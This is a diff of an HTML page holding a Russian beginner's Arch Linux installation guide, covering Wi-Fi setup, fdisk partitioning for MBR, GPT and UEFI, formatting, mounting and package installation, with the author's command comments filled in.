@@ -10,6 +10,7 @@
         background: #657b83;
         color: #002b36;
         font-family: monospace;
+        font-size:max(1em, min(4em, calc(100vw * 1 / 75)));
         word-break: break-all;
       }
       summary
@@ -54,8 +55,8 @@
       {
         color: #002b36;
         padding: 1%;
-        border-left: 5px dotted #002b36;
         overflow:auto;
+        text-indent: 5%;
       }
       .button
       {
@@ -77,28 +78,89 @@
     <table>
       <tr>
         <td>
-          <h1>Установка Arch Linux (От новичка, таким же новичкам)</h1>
+          <h1>Установка Arch Linux (От новичка, таким же новичкам).</h1>
         </td>
       </tr>
       <tr>
         <td>
           <p class=text>
-            За условие принимаем
+            У меня нет опыта работы с linux системами,
+            но появилось желание поменять windows на что-нибудь другое,
+            в связи с постоянным ростом количества мне не нужных "стандартных" программ.
+            Попробовав в очередной раз массу различных дистрибутивов linux, я остановился на Arch,
+            он понравился мне максимальным минимализмом.
+            Методом проб и ошибок я определил необходимый мне минимум пакетов для повседневной работы и развлечений на ПК.
           </p>
         </td>
       </tr>
       <tr>
         <td>
-          <h2>Подготовка к установке</h2>
+          <p class=text>
+            Хочу поделиться своим опытом с такими же новичками в linux как и я сам,
+            на понятном для новичков языке.
+          </p>
         </td>
       </tr>
       <tr>
         <td>
           <p class=text>
-            <a href=https://archlinux.org/download/>Скачиваем образ</a><br>
-            <a href=https://rufus.ie/ru/>Скачиваем rufus</a><br>
-            Записываем образ на флешку, при перезагрузке загружаемся с флешки(если есть uefi, то выбираем загрузку через uefi) и выбираем первый пункт меню.<br>
-    <strong>Важно знать что после этой установки все данные с дисков будут удалены</strong>
+            <strong>
+              Важно знать, что после этой установки все данные с дисков будут удалены.
+            </strong>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <h2>Подготовка к установке.</h2>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            Заходим на
+            <a href=https://wiki.archlinux.org/title/Installation_guide_(Русский)>
+            wiki.archlinux
+            </a>
+            если там изложено понятно, то лучше использовать официальную wiki.
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            Определяем какой режим загрузки использует ваш ПК,
+            UEFI или Legacy Boot.
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            <a href=https://archlinux.org/download/>Скачиваем образ.</a>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            <a href=https://rufus.ie/ru/>Скачиваем rufus.</a>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            Записываем образ на флешку, при перезагрузке загружаемся с флешки и выбираем первый пункт меню (<strong>Если есть uefi, то выбираем загрузку через uefi</strong>).
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            Для установки необходимо постоянное интернет соединение,
+            это одна из особенностей Arch,
+            он устанавливает обновленные пакеты.
           </p>
         </td>
       </tr>
@@ -106,7 +168,7 @@
         <td>
           <details>
             <summary>
-              Если ПК подключён к сети через Wi-Fi
+              Если ПК подключён к сети через Wi-Fi.
             </summary>
             <table>
               <tr>
@@ -114,7 +176,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>iwctl station wlan0 connect ИмяСети</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Подключаем устройство wlan0 к wifi сети ИмяСети.</em>
                   </p>
                 </td>
               </tr>
@@ -128,7 +190,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>ПарольСети</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Вводим пароль wifi сети.</em>
                   </p>
                 </td>
               </tr>
@@ -146,7 +208,7 @@
           <p class=term>
             <em class=ps1>root@archiso~#</em>
             <strong>ping -c 3 ya.ru</strong>
-            <em class=comm>#</em>
+            <em class=comm>#Проверка соединения, 3 раза прозвон ya.ru.</em>
           </p>
         </td>
       </tr>
@@ -160,7 +222,7 @@
           <p class=term>
             <em class=ps1>root@archiso~#</em>
             <strong>loadkeys ru</strong>
-            <em class=comm>#</em>
+            <em class=comm>#Выбираем русскую раскладку.</em>
           </p>
         </td>
       </tr>
@@ -174,7 +236,7 @@
           <p class=term>
             <em class=ps1>root@archiso~#</em>
             <strong>setfont cyr-sun16</strong>
-            <em class=comm>#</em>
+            <em class=comm>#Установка шрифта с кириллицей.</em>
           </p>
         </td>
       </tr>
@@ -188,7 +250,7 @@
           <p class=term>
             <em class=ps1>root@archiso~#</em>
             <strong>timedatectl set-ntp true</strong>
-            <em class=comm>#</em>
+            <em class=comm>#Синхронизация системных часов.</em>
           </p>
         </td>
       </tr>
@@ -204,7 +266,7 @@
       </tr>
       <tr>
         <td>
-          <h2>Разметка и форматирование носителей</h2>
+          <h2>Разметка и форматирование носителей.</h2>
         </td>
       </tr>
       <tr>
@@ -212,7 +274,7 @@
           <p class=term>
             <em class=ps1>root@archiso~#</em>
             <strong>fdisk -l</strong>
-            <em class=comm>#Просмотр носителей</em>
+            <em class=comm>#Просмотр носителей.</em>
           </p>
         </td>
       </tr>
@@ -225,14 +287,26 @@
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>fdisk /dev/ВашСистемныйДиск</strong>
-            <em class=comm>#</em>
+            <strong>fdisk /dev/sda</strong>
+            <em class=comm>#Переход в будущий системный диск.</em>
           </p>
         </td>
       </tr>
       <tr>
         <td>
           <em class=button>ENTER</em>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=text>
+            Далее выбираем пункт, подходящий для вашего ПК.
+            Современные ПК имеют поддержку UEFI,
+            лучше выбирать именно этот пункт,
+            он подразумевает отказ от дополнительной установки GRAB-а.
+            В случае отсутствия UEFI,
+            выбирайте LEGACY BOOT -> GPT (GPT разметка более современная).
+          </p>
         </td>
       </tr>
       <tr>
@@ -254,7 +328,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>o</strong>
-                            <em class=comm>#MBR_структура</em>
+                            <em class=comm>#Установить на диске MBR структуру.</em>
                           </p>
                         </td>
                       </tr>
@@ -268,7 +342,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#GRUB_раздел</em>
+                            <em class=comm>#Новый раздел (GRUB-раздел).</em>
                           </p>
                         </td>
                       </tr>
@@ -282,7 +356,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>p</strong>
-                            <em class=comm>#PrimaryPartition</em>
+                            <em class=comm>#PrimaryPartition.</em>
                           </p>
                         </td>
                       </tr>
@@ -296,7 +370,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>1</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (1 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -310,7 +384,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>2048</strong>
-                            <em class=comm>#FirstSector</em>
+                            <em class=comm>#Первый сектор (2048 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -323,8 +397,8 @@
                         <td>
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
-                            <strong>+500m</strong>
-                            <em class=comm>#Размер_GRUB_раздела</em>
+                            <strong>+512m</strong>
+                            <em class=comm>#Размер GRUB-раздела.</em>
                           </p>
                         </td>
                       </tr>
@@ -338,7 +412,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -352,7 +426,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>a</strong>
-                            <em class=comm>#BootФлаг</em>
+                            <em class=comm>#Установить Boot-флаг загрузки.</em>
                           </p>
                         </td>
                       </tr>
@@ -366,7 +440,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#SWAP_раздел</em>
+                            <em class=comm>#Новый раздел (SWAP-раздел).</em>
                           </p>
                         </td>
                       </tr>
@@ -380,7 +454,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>p</strong>
-                            <em class=comm>#PrimaryPartition</em>
+                            <em class=comm>#PrimaryPartition.</em>
                           </p>
                         </td>
                       </tr>
@@ -394,7 +468,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>2</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (2 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -412,8 +486,16 @@
                         <td>
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
-                            <strong>+1g</strong>
-                            <em class=comm>#РазмерSWAPРаздела(Обычно_X2_ОЗУ)</em>
+                            <strong>+8g</strong>
+                            <em class=comm>#Размер SWAP-раздела устанавливаем по формуле:<br>
+                            1Gb-2Gb(RAM)=1Gb(Swap),<br>
+                            3Gb-6Gb(RAM)=2Gb(Swap),<br>
+                            8Gb-12Gb(RAM)=3Gb(Swap),<br>
+                            16Gb(RAM)=4Gb(Swap),<br>
+                            24Gb(RAM)=5Gb(Swap),<br>
+                            32Gb(RAM)=6Gb(Swap),<br>
+                            64Gb(RAM)=8Gb(Swap),<br>
+                            128Gb(RAM)=11Gb(Swap).</em>
                           </p>
                         </td>
                       </tr>
@@ -427,7 +509,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -441,7 +523,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#RootРаздел</em>
+                            <em class=comm>#Новый раздел (ROOT-раздел).</em>
                           </p>
                         </td>
                       </tr>
@@ -455,7 +537,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>p</strong>
-                            <em class=comm>#PrimaryPartition</em>
+                            <em class=comm>#PrimaryPartition.</em>
                           </p>
                         </td>
                       </tr>
@@ -469,7 +551,82 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>3</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (3 по умолчанию, можно сразу нажать ENTER).</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>+50g</strong>
+                            <em class=comm>#Размер ROOT-раздела.</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>y</strong>
+                            <em class=comm>#Да.</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>n</strong>
+                            <em class=comm>#Новый раздел(HOME-раздел).</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>p</strong>
+                            <em class=comm>#PrimaryPartition.</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>4</strong>
+                            <em class=comm>#Номер раздела (4 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -493,7 +650,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -507,21 +664,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>w</strong>
-                            <em class=comm>#Записать</em>
-                          </p>
-                        </td>
-                      </tr>
-                      <tr>
-                        <td>
-                          <em class=button>ENTER</em>
-                        </td>
-                      </tr>
-                      <tr>
-                        <td>
-                          <p class=term>
-                            <em class=ps1>root@archiso~#</em>
-                            <strong>mkfs.ext2 /dev/GRUBРаздел(sda1,nvme0n1p1)</strong>
-                            <em class=comm>#</em>
+                            <em class=comm>#Записать изменения на диск.</em>
                           </p>
                         </td>
                       </tr>
@@ -546,7 +689,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>g</strong>
-                            <em class=comm>#GPTСтруктура</em>
+                            <em class=comm>#Установить на диске GPT структуру.</em>
                           </p>
                         </td>
                       </tr>
@@ -560,7 +703,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#GRUBРаздел</em>
+                            <em class=comm>#Новый раздел (GRUB-раздел).</em>
                           </p>
                         </td>
                       </tr>
@@ -574,7 +717,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>1</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (1 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -588,7 +731,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>2048</strong>
-                            <em class=comm>#FirstSector</em>
+                            <em class=comm>#Первый сектор (2048 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -601,8 +744,8 @@
                         <td>
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
-                            <strong>+500m</strong>
-                            <em class=comm>#РазмерGRUBРаздела</em>
+                            <strong>+512m</strong>
+                            <em class=comm>#Размер GRUB-раздела.</em>
                           </p>
                         </td>
                       </tr>
@@ -616,7 +759,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -630,7 +773,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#РазделОбразаGRUB</em>
+                            <em class=comm>#Новый раздел (Образ-GRUB).</em>
                           </p>
                         </td>
                       </tr>
@@ -644,7 +787,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>2</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (2 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -663,7 +806,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>+1m</strong>
-                            <em class=comm>#РазмерРазделОбразаGRUB</em>
+                            <em class=comm>#Размер Образа-GRUB.</em>
                           </p>
                         </td>
                       </tr>
@@ -677,7 +820,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -691,7 +834,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>t</strong>
-                            <em class=comm>#СменитьТипРаздела</em>
+                            <em class=comm>#Сменить тип раздела.</em>
                           </p>
                         </td>
                       </tr>
@@ -705,7 +848,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>2</strong>
-                            <em class=comm>#НомерРаздела</em>
+                            <em class=comm>#Номер раздела, который надо изменить.</em>
                           </p>
                         </td>
                       </tr>
@@ -719,7 +862,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>4</strong>
-                            <em class=comm>#ТипBiosBoot</em>
+                            <em class=comm>#Установить тип раздела: BiosBoot.</em>
                           </p>
                         </td>
                       </tr>
@@ -733,7 +876,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#SWAPРаздел</em>
+                            <em class=comm>#Новый раздел (SWAP-раздел).</em>
                           </p>
                         </td>
                       </tr>
@@ -747,7 +890,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>3</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (3 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -765,8 +908,16 @@
                         <td>
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
-                            <strong>+1g</strong>
-                            <em class=comm>#РазмерSWAPРаздела(ОбычноX2ОЗУ)</em>
+                            <strong>+8g</strong>
+                            <em class=comm>#Размер SWAP-раздела устанавливаем по формуле:<br>
+                            1Gb-2Gb(RAM)=1Gb(Swap),<br>
+                            3Gb-6Gb(RAM)=2Gb(Swap),<br>
+                            8Gb-12Gb(RAM)=3Gb(Swap),<br>
+                            16Gb(RAM)=4Gb(Swap),<br>
+                            24Gb(RAM)=5Gb(Swap),<br>
+                            32Gb(RAM)=6Gb(Swap),<br>
+                            64Gb(RAM)=8Gb(Swap),<br>
+                            128Gb(RAM)=11Gb(Swap).</em>
                           </p>
                         </td>
                       </tr>
@@ -780,7 +931,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -794,7 +945,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>n</strong>
-                            <em class=comm>#RootРаздел</em>
+                            <em class=comm>#Новый раздел (ROOT-раздел).</em>
                           </p>
                         </td>
                       </tr>
@@ -808,7 +959,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>4</strong>
-                            <em class=comm>#PartitionNumber</em>
+                            <em class=comm>#Номер раздела (4 по умолчанию, можно сразу нажать ENTER).</em>
                           </p>
                         </td>
                       </tr>
@@ -823,7 +974,16 @@
                         </td>
                       </tr>
                       <tr>
-                          <td>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>+50g</strong>
+                            <em class=comm>#Размер ROOT-разделa.</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
                           <em class=button>ENTER</em>
                         </td>
                       </tr>
@@ -832,7 +992,59 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>y</strong>
-                            <em class=comm>#ДаЕслиСпросил</em>
+                            <em class=comm>#Да.</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>n</strong>
+                            <em class=comm>#Новый раздел(HOME-раздел).</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>5</strong>
+                            <em class=comm>#Номер раздела (5 по умолчанию, можно сразу нажать ENTER).</em>
+                          </p>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <em class=button>ENTER</em>
+                        </td>
+                      </tr>
+                      <tr>
+                        <td>
+                          <p class=term>
+                            <em class=ps1>root@archiso~#</em>
+                            <strong>y</strong>
+                            <em class=comm>#Да.</em>
                           </p>
                         </td>
                       </tr>
@@ -846,7 +1058,7 @@
                           <p class=term>
                             <em class=ps1>root@archiso~#</em>
                             <strong>w</strong>
-                            <em class=comm>#Записать</em>
+                            <em class=comm>#Записать изменения на диск.</em>
                           </p>
                         </td>
                       </tr>
@@ -857,6 +1069,20 @@
                       </tr>
                     </table>
                   </details>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <p class=term>
+                    <em class=ps1>root@archiso~#</em>
+                    <strong>mkfs.ext2 /dev/sda1 -L boot</strong>
+                    <em class=comm>#Форматируем GRUB-раздел.</em>
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <em class=button>ENTER</em>
                 </td>
               </tr>
             </table>
@@ -874,8 +1100,17 @@
                 <td>
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
+                    <strong>g</strong>
+                    <em class=comm>#Установить на диске GPT структуру.</em>
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <p class=term>
+                    <em class=ps1>root@archiso~#</em>
                     <strong>n</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Новый раздел (BOOT-раздел).</em>
                   </p>
                 </td>
               </tr>
@@ -893,8 +1128,8 @@
                 <td>
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
-                    <strong>+500m</strong>
-                    <em class=comm>#</em>
+                    <strong>+512m</strong>
+                    <em class=comm>#Размер BOOT-раздела.</em>
                   </p>
                 </td>
               </tr>
@@ -908,7 +1143,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>t</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Сменить тип раздела.</em>
                   </p>
                 </td>
               </tr>
@@ -922,7 +1157,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>1</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Номер раздела, который надо изменить.</em>
                   </p>
                 </td>
               </tr>
@@ -936,7 +1171,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>1</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Установить тип раздела: BOOT!!!!.</em>
                   </p>
                 </td>
               </tr>
@@ -950,7 +1185,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>n</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Новый раздел (SWAP-раздел).</em>
                   </p>
                 </td>
               </tr>
@@ -968,8 +1203,16 @@
                 <td>
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
-                    <strong>+1g</strong>
-                    <em class=comm>#</em>
+                    <strong>+8g</strong>
+                    <em class=comm>#Размер SWAP-раздела устанавливаем по формуле:
+                    1Gb-2Gb(RAM)=1Gb(Swap),
+                    3Gb-6Gb(RAM)=2Gb(Swap),
+                    8Gb-12Gb(RAM)=3Gb(Swap),
+                    16Gb(RAM)=4Gb(Swap),
+                    24Gb(RAM)=5Gb(Swap),
+                    32Gb(RAM)=6Gb(Swap),
+                    64Gb(RAM)=8Gb(Swap),
+                    128Gb(RAM)=11Gb(Swap).</em>
                   </p>
                 </td>
               </tr>
@@ -983,7 +1226,7 @@
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
                     <strong>n</strong>
-                    <em class=comm>#</em>
+                    <em class=comm>#Новый раздел(ROOT-раздел).</em>
                   </p>
                 </td>
               </tr>
@@ -1001,8 +1244,46 @@
                 <td>
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
-                    <strong>mkfs.fat -F32 /dev/nvme0n1p1</strong>
-                    <em class=comm>#</em>
+                    <strong>+50g</strong>
+                    <em class=comm>#Размер ROOT-раздела.</em>
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <em class=button>ENTER</em>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <em class=button>ENTER</em>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <p class=term>
+                    <em class=ps1>root@archiso~#</em>
+                    <strong>n</strong>
+                    <em class=comm>#Новый раздел(HOME-раздел).</em>
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <em class=button>ENTER</em>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <em class=button>ENTER</em>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <p class=term>
+                    <em class=ps1>root@archiso~#</em>
+                    <strong>w</strong>
+                    <em class=comm>#Записать изменения на диск.</em>
                   </p>
                 </td>
               </tr>
@@ -1015,8 +1296,8 @@
                 <td>
                   <p class=term>
                     <em class=ps1>root@archiso~#</em>
-                    <strong>mkfs.ext4 /dev/nvme0n1p3</strong>
-                    <em class=comm>#</em>
+                    <strong>mkfs.fat -F32 /dev/sda1 -L boot</strong>
+                    <em class=comm>#Форматируем BOOT-раздел.</em>
                   </p>
                 </td>
               </tr>
@@ -1033,8 +1314,68 @@
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>mkfs.ext4 /dev/nvme1n1 -L games</strong>
-            <em class=comm>#</em>
+            <strong>mkswap /dev/sda2(3) -L swap</strong>
+            <em class=comm>#Форматируем SWAP-раздел.</em>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <em class=button>ENTER</em>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=term>
+            <em class=ps1>root@archiso~#</em>
+            <strong>mkfs.ext4 /dev/sda3(4) -L root</strong>
+            <em class=comm>#Форматируем ROOT-раздел.</em>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <em class=button>ENTER</em>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=term>
+            <em class=ps1>root@archiso~#</em>
+            <strong>mkfs.ext4 /dev/sda4(5) -L home</strong>
+            <em class=comm>#Форматируем HOME-раздел.</em>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <em class=button>ENTER</em>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=term>
+            <em class=ps1>root@archiso~#</em>
+            <strong>fdisk /dev/sdb</strong>
+            <em class=comm>#Переход в логический диск.</em>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=term>
+            <em class=ps1>root@archiso~#</em>
+            <strong>g(o)</strong>
+            <em class=comm>#Установить на диске GPT(MBR) структуру.</em>
+          </p>
+        </td>
+      </tr>
+      <tr>
+        <td>
+          <p class=term>
+            <em class=ps1>root@archiso~#</em>
+            <strong>w</strong>
+            <em class=comm>#Записать изменения на диск.</em>
           </p>
         </td>
       </tr>
@@ -1061,7 +1402,7 @@
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>mkswap /dev/nvme0n1p2</strong>
+            <strong>mount /dev/sda3(4) /mnt</strong>
             <em class=comm>#</em>
           </p>
         </td>
@@ -1075,7 +1416,7 @@
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>mount /dev/nvme0n1p3 /mnt</strong>
+            <strong>mkdir /mnt/{boot,home,data}</strong>
             <em class=comm>#</em>
           </p>
         </td>
@@ -1089,21 +1430,16 @@
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>mkdir /mnt/{boot,data,games}</strong>
+            <strong>mount /dev/sda1 /mnt/boot</strong>
             <em class=comm>#</em>
           </p>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <em class=button>ENTER</em>
         </td>
       </tr>
       <tr>
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>mount /dev/nvme0n1p1 /mnt/boot</strong>
+            <strong>swapon /dev/sda2(3)</strong>
             <em class=comm>#</em>
           </p>
         </td>
@@ -1113,11 +1449,13 @@
           <em class=button>ENTER</em>
         </td>
       </tr>
+      <tr>
+
       <tr>
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
-            <strong>mount /dev/nvme1n1 /mnt/games</strong>
+            <strong>mount /dev/sda4(5) /mnt/home</strong>
             <em class=comm>#</em>
           </p>
         </td>
@@ -1127,7 +1465,6 @@
           <em class=button>ENTER</em>
         </td>
       </tr>
-      <tr>
         <td>
           <p class=term>
             <em class=ps1>root@archiso~#</em>
@@ -1139,15 +1476,6 @@
       <tr>
         <td>
           <em class=button>ENTER</em>
-        </td>
-      </tr>
-      <tr>
-        <td>
-          <p class=term>
-            <em class=ps1>root@archiso~#</em>
-            <strong>swapon /dev/nvme0n1p2</strong>
-            <em class=comm>#</em>
-          </p>
         </td>
       </tr>
       <tr>
@@ -2590,9 +2918,7 @@
         <td>
           <p class=term>
             <em class=ps1>usert@pc~$</em>
-            <strong>sudo pacman -S doublecmd-qt5</strong>
-            <em class=comm>#</em>
-            <strong>caja</strong>
+            <strong>sudo pacman -S thunar</strong>
             <em class=comm>#</em>
             <strong>mc</strong>
             <em class=comm>#</em>
@@ -3069,7 +3395,8 @@
       <tr>
         <td>
           <p class=term>
-            nano ~/.config/conky/conky.conf
+            <em class=ps1>usert@pc~$</em>
+            <strong>nano ~/.config/conky/conky.conf</strong>
             <em class=comm>#</em>
           </p>
         </td>
@@ -3082,109 +3409,192 @@
       <tr>
         <td>
           <p class=term>
-            conky.config = {
+            <strong>conky.config = {</strong>
             <em class=comm>#</em><br>
-            alignment = 'top_right',
+            <strong>alignment = 'top_right',</strong>
             <em class=comm>#</em><br>
-            background = false,
+            <strong>background = false,</strong>
             <em class=comm>#</em><br>
-            border_width = 1,
